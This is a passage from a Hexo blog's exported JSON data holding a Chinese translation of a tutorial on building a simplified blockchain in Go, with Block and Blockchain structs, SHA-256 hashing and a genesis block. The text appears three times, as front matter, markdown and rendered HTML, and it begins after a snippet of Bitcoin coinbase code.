class=\"line\">\tassert(txCoinbase.vin[0].scriptSig.size() &lt;= 100);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpblock-&gt;vtx[0] = MakeTransactionRef(std::move(txCoinbase));</span><br><span class=\"line\">\t// 重新构建Merkle数，计算MerkleRoot</span><br><span class=\"line\">\tpblock-&gt;hashMerkleRoot = BlockMerkleRoot(*pblock);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"简化版区块链的实现（翻译）","comments":0,"date":"2018-03-16T02:05:23.000Z","img":null,"_content":"\n[原文链接：译自 Jeiwan/blockchain_go 的系列文章之一](https://jeiwan.cc/posts/building-blockchain-in-go-part-1/)\n\n区块链是分布式数据存储、点对点传输、共识机制、加密算法等计算机技术的新型应用模式,\t共识机制是区块链系统中实现不同节点之间建立信任、获取权益的数学算法.\n\n区块链从狭义来讲是一个放在非安全环境中的分布式数据库,这是一个分布式,去中心化的系统,同时有下面的优势:\n\n>* 用密码学的方法来保证已有数据不可能篡改.\n>* 用共识算法来对新增数据达成共识.\n\n在区块链中，存储有效信息的是区块. 比如，比特币区块存储的有效信息，就是比特币交易，交易信息也是所有加密货币的本质. 除此以外，区块还包含了一些技术信息，比如版本，当前时间戳和前一个区块的哈希.\n\n在这里,我们并不能实现一个像比特币技术规范所说的区块链,而是用golang实现一个简化版的区块链,它只包含一些关键信息.\n```go\ntype Block struct {\n    Timestamp     int64    /时间戳\n    Data          []byte   /区块存储的信息\n    PrevBlockHash []byte    /上一个块的hash值\n    Hash          []byte     /当前块的hash值\n}\n```\n在区块链技术中，Timestamp, PrevBlockHash, Hash 是区块头（block header），区块头是一个单独的数据结构.而交易，也就是这里的 Data 信息, 是一个单独的数据结构.在这里为了简化,把这里的  Data 和交易数据进行了混合.\n\nhash值计算是区块链一个非常重要的部分.正是由于这个特性，才使得区块链是安全的.计算一个hash,是在计算上非常困难的一个操作.即使在矿机上，也要花费一定的时间 .这样的架构设计，使得加入新的区块十分困难，就可以保证区块一旦被加入以后，很难再进行修改.\n\n现在,我们只需要使用区块结构的Timestamp,Data和PrevBlockHash字段,并将它们相互连接起来,并在连接后的结果上计算一个sha-256的hash.\n```go\nfunc (b *Block) SetHash() {\n  timestamp := []byte(strconv.FormatInt(b.Timestamp, 10))\n  headers := bytes.Join([][]byte{b.PrevBlockHash, b.Data, timestamp}, []byte{})\n  hash := sha256.Sum256(headers)\n\n  b.Hash = hash[:]\n}\n```\n如上代码,我们使用 SetHash 的方法完成计算.\n\n按照 Golang 的惯例，我们会实现一个用于简化创建一个区块的函数：\n```go\nfunc NewBlock(data string, prevBlockHash []byte) *Block {\n  block := &Block{time.Now().Unix(), []byte(data), prevBlockHash, []byte{}}\n  block.SetHash()\n  return block\n}\n```\n到了这里,整个区块部分已经完成.\n\n\n下面就该实现区块链了,区块链本质上是一个有着特定结构的数据库，是一个有序后向连接的列表.也就是说，区块按照插入的顺序进行存储，每个块都被连接到前一个块,这样的结构，能够让我们快速地获取链上的最新块，并且高效地通过哈希来检索一个块,\n\n\n在 Go中，通过一个 array 和 map 来实现这个结构：array 存储有序的哈希（Golang 中 array 是有序的），map 存储 hask -> block 对(Golang 中, map 是无序的). 在基本的原型阶段，现在还不需要通过哈希来获取块,所以这里只用到了 array.\n```go\ntype Blockchain struct {\n  blocks []*Block\n}\n```\n\n现在，给它添加一个块：\n```go\nfunc (bc *Blockchain) AddBlock(data string) {\n  prevBlock := bc.blocks[len(bc.blocks)-1]\n  newBlock := NewBlock(data, prevBlock.Hash)\n  bc.blocks = append(bc.blocks, newBlock)\n}\n```\n\n为了加入一个新的块，必须要有一个已有的块，现在我们的链是空的，一个块也没有,所以，在区块链中，必须有一个创世区块(genesis block)，也就是链中的第一个块，用下面的方法来创建一个创世块：\n```go\nfunc NewGenesisBlock() *Block {\n    return NewBlock(\"Genesis Block\", []byte{})\n}\n用一个函数来创建有创世块的区块链：\nfunc NewBlockchain() *Blockchain {\n    return &Blockchain{[]*Block{NewGenesisBlock()}}\n}\n```\n检查区块链是否正常工作：\n```go\nfunc main() {\n  bc := NewBlockchain()\n\n  bc.AddBlock(\"Send 1 BTC to Ivan\")\n  bc.AddBlock(\"Send 2 more BTC to Ivan\")\n\n  for _, block := range bc.blocks {\n    fmt.Printf(\"Prev. hash: %x\\n\", block.PrevBlockHash)\n    fmt.Printf(\"Data: %s\\n\", block.Data)\n    fmt.Printf(\"Hash: %x\\n\", block.Hash)\n    fmt.Println()\n  }\n}\n```\n输出结果:\n\n![](/images/b1.png)\n\n完整代码:\n```go\npackage main\n\nimport (\n    \"bytes\"\n    \"crypto/sha256\"\n    \"fmt\"\n    \"strconv\"\n    \"time\"\n)\n\ntype Block struct {\n    Timestamp     int64\n    Data          []byte\n    PrevBlockHash []byte\n    Hash          []byte\n}\n\nfunc (b *Block) SetHash() {\n    timestamp := []byte(strconv.FormatInt(b.Timestamp, 10))\n    headers := bytes.Join([][]byte{b.PrevBlockHash, b.Data, timestamp}, []byte{})\n    hash := sha256.Sum256(headers)\n    b.Hash = hash[:]\n}\n\n/*\n    初始化第一个块\n*/\nfunc NewBlock(data string, prevBlockHash []byte) *Block {\n    block := &Block{time.Now().Unix(), []byte(data), prevBlockHash, []byte{}}\n    block.SetHash()\n    return block\n}\n\ntype Blockchain struct {\n    blocks []*Block\n}\n\n/*\n    添加 区块\n*/\n\nfunc (bc *Blockchain) AddBlock(data string) {\n    prevBlock := bc.blocks[len(bc.blocks)-1]\n    newBlock := NewBlock(data, prevBlock.Hash)\n    bc.blocks = append(bc.blocks, newBlock)\n}\n\nfunc NewGenesisBlock() *Block {\n    return NewBlock(\"Genesis Block创始块\", []byte{})\n}\n\n/*\n    用创始块创建一个区块链的函数\n*/\nfunc NewBlockchain() *Blockchain {\n    return &Blockchain{[]*Block{NewGenesisBlock()}} /*我不太理解这种语法,层层深入？*/\n}\n\nfunc main() {\n    /*\n       初始化\n    */\n    bc := NewBlockchain()\n\n    /*\n       添加记录\n    */\n    bc.AddBlock(\"Send 1 BTC TO L\")\n    bc.AddBlock(\"Send 2 BTC to R\")\n\n    /*\n      查看我们最终存储结果\n    */\n    for _, block := range bc.blocks {\n        fmt.Printf(\"Prev: hash:%x\\n\", block.PrevBlockHash)\n        fmt.Printf(\"Data: %s\\n\", block.Data)\n        fmt.Printf(\"Hash: %x\\n\", block.Hash)\n        fmt.Println()\n    }\n}\n```\n以上,创建了一个简单的区块链原型：它仅仅是一个数组构成的一系列区块，每个块都与前一个块相关联.\n真实的区块链要比这复杂得多,在上面的区块链中，加入新的块非常简单，而且很快，但在比特币中，加入新的块需要很多工作：\n\n必须要经过完整的运算（工作量证明），获得添加一个新块的权力.并且，区块链是一个没有单一决策者的分布式数据库,一个新的块必须要被网络的其他参与者确认和同意（共识）.还有很重要的一点，上面的区块链目前还没有一笔交易.\n\n","source":"_posts/简化版区块链的实现.md","raw":"---\ntitle: 简化版区块链的实现（翻译）\ncomments: false\ndate: 2018-03-16 10:05:23\ncategories: 矿池\ntags:\n- lucas556\n- 矿池\n- 区块链\nimg:\n---\n\n[原文链接：译自 Jeiwan/blockchain_go 的系列文章之一](https://jeiwan.cc/posts/building-blockchain-in-go-part-1/)\n\n区块链是分布式数据存储、点对点传输、共识机制、加密算法等计算机技术的新型应用模式,\t共识机制是区块链系统中实现不同节点之间建立信任、获取权益的数学算法.\n\n区块链从狭义来讲是一个放在非安全环境中的分布式数据库,这是一个分布式,去中心化的系统,同时有下面的优势:\n\n>* 用密码学的方法来保证已有数据不可能篡改.\n>* 用共识算法来对新增数据达成共识.\n\n在区块链中，存储有效信息的是区块. 比如，比特币区块存储的有效信息，就是比特币交易，交易信息也是所有加密货币的本质. 除此以外，区块还包含了一些技术信息，比如版本，当前时间戳和前一个区块的哈希.\n\n在这里,我们并不能实现一个像比特币技术规范所说的区块链,而是用golang实现一个简化版的区块链,它只包含一些关键信息.\n```go\ntype Block struct {\n    Timestamp     int64    /时间戳\n    Data          []byte   /区块存储的信息\n    PrevBlockHash []byte    /上一个块的hash值\n    Hash          []byte     /当前块的hash值\n}\n```\n在区块链技术中，Timestamp, PrevBlockHash, Hash 是区块头（block header），区块头是一个单独的数据结构.而交易，也就是这里的 Data 信息, 是一个单独的数据结构.在这里为了简化,把这里的  Data 和交易数据进行了混合.\n\nhash值计算是区块链一个非常重要的部分.正是由于这个特性，才使得区块链是安全的.计算一个hash,是在计算上非常困难的一个操作.即使在矿机上，也要花费一定的时间 .这样的架构设计，使得加入新的区块十分困难，就可以保证区块一旦被加入以后，很难再进行修改.\n\n现在,我们只需要使用区块结构的Timestamp,Data和PrevBlockHash字段,并将它们相互连接起来,并在连接后的结果上计算一个sha-256的hash.\n```go\nfunc (b *Block) SetHash() {\n  timestamp := []byte(strconv.FormatInt(b.Timestamp, 10))\n  headers := bytes.Join([][]byte{b.PrevBlockHash, b.Data, timestamp}, []byte{})\n  hash := sha256.Sum256(headers)\n\n  b.Hash = hash[:]\n}\n```\n如上代码,我们使用 SetHash 的方法完成计算.\n\n按照 Golang 的惯例，我们会实现一个用于简化创建一个区块的函数：\n```go\nfunc NewBlock(data string, prevBlockHash []byte) *Block {\n  block := &Block{time.Now().Unix(), []byte(data), prevBlockHash, []byte{}}\n  block.SetHash()\n  return block\n}\n```\n到了这里,整个区块部分已经完成.\n\n\n下面就该实现区块链了,区块链本质上是一个有着特定结构的数据库，是一个有序后向连接的列表.也就是说，区块按照插入的顺序进行存储，每个块都被连接到前一个块,这样的结构，能够让我们快速地获取链上的最新块，并且高效地通过哈希来检索一个块,\n\n\n在 Go中，通过一个 array 和 map 来实现这个结构：array 存储有序的哈希（Golang 中 array 是有序的），map 存储 hask -> block 对(Golang 中, map 是无序的). 在基本的原型阶段，现在还不需要通过哈希来获取块,所以这里只用到了 array.\n```go\ntype Blockchain struct {\n  blocks []*Block\n}\n```\n\n现在，给它添加一个块：\n```go\nfunc (bc *Blockchain) AddBlock(data string) {\n  prevBlock := bc.blocks[len(bc.blocks)-1]\n  newBlock := NewBlock(data, prevBlock.Hash)\n  bc.blocks = append(bc.blocks, newBlock)\n}\n```\n\n为了加入一个新的块，必须要有一个已有的块，现在我们的链是空的，一个块也没有,所以，在区块链中，必须有一个创世区块(genesis block)，也就是链中的第一个块，用下面的方法来创建一个创世块：\n```go\nfunc NewGenesisBlock() *Block {\n    return NewBlock(\"Genesis Block\", []byte{})\n}\n用一个函数来创建有创世块的区块链：\nfunc NewBlockchain() *Blockchain {\n    return &Blockchain{[]*Block{NewGenesisBlock()}}\n}\n```\n检查区块链是否正常工作：\n```go\nfunc main() {\n  bc := NewBlockchain()\n\n  bc.AddBlock(\"Send 1 BTC to Ivan\")\n  bc.AddBlock(\"Send 2 more BTC to Ivan\")\n\n  for _, block := range bc.blocks {\n    fmt.Printf(\"Prev. hash: %x\\n\", block.PrevBlockHash)\n    fmt.Printf(\"Data: %s\\n\", block.Data)\n    fmt.Printf(\"Hash: %x\\n\", block.Hash)\n    fmt.Println()\n  }\n}\n```\n输出结果:\n\n![](/images/b1.png)\n\n完整代码:\n```go\npackage main\n\nimport (\n    \"bytes\"\n    \"crypto/sha256\"\n    \"fmt\"\n    \"strconv\"\n    \"time\"\n)\n\ntype Block struct {\n    Timestamp     int64\n    Data          []byte\n    PrevBlockHash []byte\n    Hash          []byte\n}\n\nfunc (b *Block) SetHash() {\n    timestamp := []byte(strconv.FormatInt(b.Timestamp, 10))\n    headers := bytes.Join([][]byte{b.PrevBlockHash, b.Data, timestamp}, []byte{})\n    hash := sha256.Sum256(headers)\n    b.Hash = hash[:]\n}\n\n/*\n    初始化第一个块\n*/\nfunc NewBlock(data string, prevBlockHash []byte) *Block {\n    block := &Block{time.Now().Unix(), []byte(data), prevBlockHash, []byte{}}\n    block.SetHash()\n    return block\n}\n\ntype Blockchain struct {\n    blocks []*Block\n}\n\n/*\n    添加 区块\n*/\n\nfunc (bc *Blockchain) AddBlock(data string) {\n    prevBlock := bc.blocks[len(bc.blocks)-1]\n    newBlock := NewBlock(data, prevBlock.Hash)\n    bc.blocks = append(bc.blocks, newBlock)\n}\n\nfunc NewGenesisBlock() *Block {\n    return NewBlock(\"Genesis Block创始块\", []byte{})\n}\n\n/*\n    用创始块创建一个区块链的函数\n*/\nfunc NewBlockchain() *Blockchain {\n    return &Blockchain{[]*Block{NewGenesisBlock()}} /*我不太理解这种语法,层层深入？*/\n}\n\nfunc main() {\n    /*\n       初始化\n    */\n    bc := NewBlockchain()\n\n    /*\n       添加记录\n    */\n    bc.AddBlock(\"Send 1 BTC TO L\")\n    bc.AddBlock(\"Send 2 BTC to R\")\n\n    /*\n      查看我们最终存储结果\n    */\n    for _, block := range bc.blocks {\n        fmt.Printf(\"Prev: hash:%x\\n\", block.PrevBlockHash)\n        fmt.Printf(\"Data: %s\\n\", block.Data)\n        fmt.Printf(\"Hash: %x\\n\", block.Hash)\n        fmt.Println()\n    }\n}\n```\n以上,创建了一个简单的区块链原型：它仅仅是一个数组构成的一系列区块，每个块都与前一个块相关联.\n真实的区块链要比这复杂得多,在上面的区块链中，加入新的块非常简单，而且很快，但在比特币中，加入新的块需要很多工作：\n\n必须要经过完整的运算（工作量证明），获得添加一个新块的权力.并且，区块链是一个没有单一决策者的分布式数据库,一个新的块必须要被网络的其他参与者确认和同意（共识）.还有很重要的一点，上面的区块链目前还没有一笔交易.\n\n","slug":"简化版区块链的实现","published":1,"updated":"2018-03-16T07:50:59.579Z","layout":"post","photos":[],"link":"","_id":"cjf7piawd002cpkwovy527fv4","content":"<p><a href=\"https://jeiwan.cc/posts/building-blockchain-in-go-part-1/\" target=\"_blank\" rel=\"noopener\">原文链接：译自 Jeiwan/blockchain_go 的系列文章之一</a></p>\n<p>区块链是分布式数据存储、点对点传输、共识机制、加密算法等计算机技术的新型应用模式,    共识机制是区块链系统中实现不同节点之间建立信任、获取权益的数学算法.</p>\n<p>区块链从狭义来讲是一个放在非安全环境中的分布式数据库,这是一个分布式,去中心化的系统,同时有下面的优势:</p>\n<blockquote>\n<ul>\n<li>用密码学的方法来保证已有数据不可能篡改.</li>\n<li>用共识算法来对新增数据达成共识.</li>\n</ul>\n</blockquote>\n<p>在区块链中，存储有效信息的是区块. 比如，比特币区块存储的有效信息，就是比特币交易，交易信息也是所有加密货币的本质. 除此以外，区块还包含了一些技术信息，比如版本，当前时间戳和前一个区块的哈希.</p>\n<p>在这里,我们并不能实现一个像比特币技术规范所说的区块链,而是用golang实现一个简化版的区块链,它只包含一些关键信息.<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Block <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">    Timestamp     <span class=\"keyword\">int64</span>    /时间戳</span><br><span class=\"line\">    Data          []<span class=\"keyword\">byte</span>   /区块存储的信息</span><br><span class=\"line\">    PrevBlockHash []<span class=\"keyword\">byte</span>    /上一个块的hash值</span><br><span class=\"line\">    Hash          []<span class=\"keyword\">byte</span>     /当前块的hash值</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在区块链技术中，Timestamp, PrevBlockHash, Hash 是区块头（block header），区块头是一个单独的数据结构.而交易，也就是这里的 Data 信息, 是一个单独的数据结构.在这里为了简化,把这里的  Data 和交易数据进行了混合.</p>\n<p>hash值计算是区块链一个非常重要的部分.正是由于这个特性，才使得区块链是安全的.计算一个hash,是在计算上非常困难的一个操作.即使在矿机上，也要花费一定的时间 .这样的架构设计，使得加入新的区块十分困难，就可以保证区块一旦被加入以后，很难再进行修改.</p>\n<p>现在,我们只需要使用区块结构的Timestamp,Data和PrevBlockHash字段,并将它们相互连接起来,并在连接后的结果上计算一个sha-256的hash.<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(b *Block)</span> <span class=\"title\">SetHash</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">  timestamp := []<span class=\"keyword\">byte</span>(strconv.FormatInt(b.Timestamp, <span class=\"number\">10</span>))</span><br><span class=\"line\">  headers := bytes.Join([][]<span class=\"keyword\">byte</span>&#123;b.PrevBlockHash, b.Data, timestamp&#125;, []<span class=\"keyword\">byte</span>&#123;&#125;)</span><br><span class=\"line\">  hash := sha256.Sum256(headers)</span><br><span class=\"line\"></span><br><span class=\"line\">  b.Hash = hash[:]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如上代码,我们使用 SetHash 的方法完成计算.</p>\n<p>按照 Golang 的惯例，我们会实现一个用于简化创建一个区块的函数：<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewBlock</span><span class=\"params\">(data <span class=\"keyword\">string</span>, prevBlockHash []<span class=\"keyword\">byte</span>)</span> *<span class=\"title\">Block</span></span> &#123;</span><br><span class=\"line\">  block := &amp;Block&#123;time.Now().Unix(), []<span class=\"keyword\">byte</span>(data), prevBlockHash, []<span class=\"keyword\">byte</span>&#123;&#125;&#125;</span><br><span class=\"line\">  block.SetHash()</span><br><span class=\"line\">  <span class=\"keyword\">return</span> block</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>到了这里,整个区块部分已经完成.</p>\n<p>下面就该实现区块链了,区块链本质上是一个有着特定结构的数据库，是一个有序后向连接的列表.也就是说，区块按照插入的顺序进行存储，每个块都被连接到前一个块,这样的结构，能够让我们快速地获取链上的最新块，并且高效地通过哈希来检索一个块,</p>\n<p>在 Go中，通过一个 array 和 map 来实现这个结构：array 存储有序的哈希（Golang 中 array 是有序的），map 存储 hask -&gt; block 对(Golang 中, map 是无序的). 在基本的原型阶段，现在还不需要通过哈希来获取块,所以这里只用到了 array.<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Blockchain <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">  blocks []*Block</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>现在，给它添加一个块：<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(bc *Blockchain)</span> <span class=\"title\">AddBlock</span><span class=\"params\">(data <span class=\"keyword\">string</span>)</span></span> &#123;</span><br><span class=\"line\">  prevBlock := bc.blocks[<span class=\"built_in\">len</span>(bc.blocks)<span class=\"number\">-1</span>]</span><br><span class=\"line\">  newBlock := NewBlock(data, prevBlock.Hash)</span><br><span class=\"line\">  bc.blocks = <span class=\"built_in\">append</span>(bc.blocks, newBlock)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>为了加入一个新的块，必须要有一个已有的块，现在我们的链是空的，一个块也没有,所以，在区块链中，必须有一个创世区块(genesis block)，也就是链中的第一个块，用下面的方法来创建一个创世块：<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewGenesisBlock</span><span class=\"params\">()</span> *<span class=\"title\">Block</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> NewBlock(<span class=\"string\">\"Genesis Block\"</span>, []<span class=\"keyword\">byte</span>&#123;&#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">用一个函数来创建有创世块的区块链：</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewBlockchain</span><span class=\"params\">()</span> *<span class=\"title\">Blockchain</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &amp;Blockchain&#123;[]*Block&#123;NewGenesisBlock()&#125;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>检查区块链是否正常工作：<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">  bc := NewBlockchain()</span><br><span class=\"line\"></span><br><span class=\"line\">  bc.AddBlock(<span class=\"string\">\"Send 1 BTC to Ivan\"</span>)</span><br><span class=\"line\">  bc.AddBlock(<span class=\"string\">\"Send 2 more BTC to Ivan\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> _, block := <span class=\"keyword\">range</span> bc.blocks &#123;</span><br><span class=\"line\">    fmt.Printf(<span class=\"string\">\"Prev. hash: %x\\n\"</span>, block.PrevBlockHash)</span><br><span class=\"line\">    fmt.Printf(<span class=\"string\">\"Data: %s\\n\"</span>, block.Data)</span><br><span class=\"line\">    fmt.Printf(<span class=\"string\">\"Hash: %x\\n\"</span>, block.Hash)</span><br><span class=\"line\">    fmt.Println()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>输出结果:</p>\n<p><img src=\"/images/b1.png\" alt=\"\"></p>\n<p>完整代码:<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">    <span class=\"string\">\"bytes\"</span></span><br><span class=\"line\">    <span class=\"string\">\"crypto/sha256\"</span></span><br><span class=\"line\">    <span class=\"string\">\"fmt\"</span></span><br><span class=\"line\">    <span class=\"string\">\"strconv\"</span></span><br><span class=\"line\">    <span class=\"string\">\"time\"</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> Block <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">    Timestamp     <span class=\"keyword\">int64</span></span><br><span class=\"line\">    Data          []<span class=\"keyword\">byte</span></span><br><span class=\"line\">    PrevBlockHash []<span class=\"keyword\">byte</span></span><br><span class=\"line\">    Hash          []<span class=\"keyword\">byte</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(b *Block)</span> <span class=\"title\">SetHash</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    timestamp := []<span class=\"keyword\">byte</span>(strconv.FormatInt(b.Timestamp, <span class=\"number\">10</span>))</span><br><span class=\"line\">    headers := bytes.Join([][]<span class=\"keyword\">byte</span>&#123;b.PrevBlockHash, b.Data, timestamp&#125;, []<span class=\"keyword\">byte</span>&#123;&#125;)</span><br><span class=\"line\">    hash := sha256.Sum256(headers)</span><br><span class=\"line\">    b.Hash = hash[:]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    初始化第一个块</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewBlock</span><span class=\"params\">(data <span class=\"keyword\">string</span>, prevBlockHash []<span class=\"keyword\">byte</span>)</span> *<span class=\"title\">Block</span></span> &#123;</span><br><span class=\"line\">    block := &amp;Block&#123;time.Now().Unix(), []<span class=\"keyword\">byte</span>(data), prevBlockHash, []<span class=\"keyword\">byte</span>&#123;&#125;&#125;</span><br><span class=\"line\">    block.SetHash()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> block</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> Blockchain <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">    blocks []*Block</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    添加 区块</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(bc *Blockchain)</span> <span class=\"title\">AddBlock</span><span class=\"params\">(data <span class=\"keyword\">string</span>)</span></span> &#123;</span><br><span class=\"line\">    prevBlock := bc.blocks[<span class=\"built_in\">len</span>(bc.blocks)<span class=\"number\">-1</span>]</span><br><span class=\"line\">    newBlock := NewBlock(data, prevBlock.Hash)</span><br><span class=\"line\">    bc.blocks = <span class=\"built_in\">append</span>(bc.blocks, newBlock)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewGenesisBlock</span><span class=\"params\">()</span> *<span class=\"title\">Block</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> NewBlock(<span class=\"string\">\"Genesis Block创始块\"</span>, []<span class=\"keyword\">byte</span>&#123;&#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    用创始块创建一个区块链的函数</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewBlockchain</span><span class=\"params\">()</span> *<span class=\"title\">Blockchain</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &amp;Blockchain&#123;[]*Block&#123;NewGenesisBlock()&#125;&#125; <span class=\"comment\">/*我不太理解这种语法,层层深入？*/</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">       初始化</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    bc := 